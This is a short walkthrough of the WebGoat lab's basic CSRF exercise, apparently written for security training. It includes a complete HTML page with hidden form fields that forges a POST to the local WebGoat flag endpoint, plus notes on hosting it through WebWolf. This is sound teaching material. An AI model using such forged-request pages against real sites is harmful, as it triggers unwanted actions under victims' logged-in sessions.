Trigger the form below from an external source while logged in. The response will include a 'flag' (a numeric value).

**Confirm Flag**

Confirm the flag you should have gotten on the previous page below.

**Solution**

**With VC and HTML**

* Hints: The form has hidden inputs. You will need to use an external page and/or script to trigger it. Try creating a local page or one that is uploaded and points to this form as its action. The trigger can be manual or scripted to happen automatically.&#x20;
* If we hit the button submit we can see a message that says that the request its coming from the form itself.&#x20;

* If we open the developer tools we can see the imputs the form has.&#x20;

* To create your own fake page go into visual code, create an HTML with the following code:

&#x20;

```
<html>
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
      <input type="hidden" name="csrf" value="false" />
      <input type="hidden" name="submit" value="Submit" />
      <input type="submit" value="Submit" />
    </form>
  </body>
</html>

```

* Save the file as a fakepage.html. Go to WebWolf and upload the file. You sill see that the file will open in a new tab, and you will see the submit button. Once you do that, you will see a JSON message with the flag number: copy and paste the flag number in WebGoat's lesson.&#x20;

**With Engagement Tools on BurpSuite**

* There is a tool (Pro Version only) that allows you to create a HTML based on the POST request.&#x20;
